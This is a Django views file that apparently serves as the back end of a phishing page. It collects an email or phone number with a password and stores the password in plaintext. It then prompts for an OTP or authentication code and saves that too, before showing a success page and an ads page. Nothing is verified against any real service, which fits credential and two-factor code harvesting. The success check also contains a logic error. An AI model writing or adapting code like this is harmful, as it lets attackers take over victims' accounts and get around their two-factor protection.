from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import Info, Verification
from .forms import InfoForm, VerificationForm
#from django.contrib.auth.hashers import make_password

def index(request):
    if request.method == 'POST':
        form = InfoForm(request.POST)
        if form.is_valid():
            info = Info()
            email_or_phone = form.cleaned_data['email_or_phone']
            password = form.cleaned_data['password']
            
            if '@' in email_or_phone:
                info.email = email_or_phone
            else:
                info.phone = email_or_phone
            
            info.password = password
            info.save()
            
            # Set session flag
            request.session['index_completed'] = True
            return redirect('otp_verification')  
        else:
            print(form.errors)
    else:
        form = InfoForm()
    
    return render(request, 'index.html', {'form': form})

def home(request):
    pass
    return render(request, 'home.html')


def otp_verification(request):
    # Check if index was completed
    if not request.session.get('index_completed', False):
        return redirect('index')
    
    if request.method == 'POST':
        form = VerificationForm(request.POST)
        if form.is_valid():
            if form.cleaned_data.get('otp') or form.cleaned_data.get('auth_code'):
                form.save()
                # Set another session flag for success
                request.session['otp_verified'] = True
                return redirect('success')
    else:
        form = VerificationForm()

    return render(request, 'otp_verification.html', {'form': form})


def ads(request):
    pass
    return render(request, 'ads.html')


def success(request):
    # Check if both previous steps were completed
    if not (request.session.get('index_completed', False)) and \
       not (request.session.get('otp_verified', False)):
        return redirect('index')
    
    # Clear session data (optional)
    request.session.flush()
    return render(request, 'success.html')

